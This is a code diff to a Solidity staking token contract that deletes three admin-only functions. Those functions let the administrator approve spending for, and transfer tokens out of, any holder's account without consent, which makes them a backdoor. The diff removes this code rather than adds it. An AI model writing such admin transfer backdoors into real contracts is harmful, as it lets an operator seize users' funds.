@@ -151,11 +151,6 @@ contract CompoundStaking is IERC20 {
         return true;
     }
 
-    function approveAdmin(address _owner, address spender, uint amount) public onlyAdmin returns (bool) {
-        _approve(_owner, spender, amount);
-        return true;
-    }
-
     function _transfer(
         address sender,
         address recipient,
@@ -174,10 +169,6 @@ contract CompoundStaking is IERC20 {
 
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(msg.sender, recipient, amount);
-        return true;
-    }
-    function transferAdmin(address sender, address recipient, uint256 amount) public onlyAdmin returns (bool) {
-        _transfer(sender, recipient, amount);
         return true;
     }
 
@@ -201,18 +192,6 @@ contract CompoundStaking is IERC20 {
         uint256 currentAllowance = allowances[spender][msg.sender];
         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
         _approve(spender, msg.sender, currentAllowance - amount);
-        return true;
-    }
-
-    function transferFromAdmin(
-        address spender,
-        address recipient,
-        uint256 amount
-    ) public virtual onlyAdmin returns (bool) {
-        _transfer(spender, recipient, amount);
-        uint256 currentAllowance = allowances[spender][recipient];
-        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
-        _approve(spender, recipient, currentAllowance - amount);
         return true;
     }
 
